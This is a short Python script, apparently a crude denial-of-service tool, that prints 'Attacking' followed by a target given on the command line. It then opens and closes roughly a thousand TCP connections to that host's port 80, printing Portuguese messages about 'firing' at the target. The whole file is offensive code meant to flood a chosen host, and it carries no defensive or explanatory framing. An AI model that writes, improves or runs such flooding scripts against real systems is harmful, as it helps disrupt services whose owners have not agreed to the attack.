import socket, sys, os  
print ("][ Attacking " + sys.argv[1]  + " ... ]["  )

def attack():  
    #pid = os.fork()  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], 80))  
    s.send(sys.argv[1].encode());  
    s.close()  
for i in range(1, 1000):  
    attack()
    print('disparando pela',i,'vez no alvo:', sys.argv[1])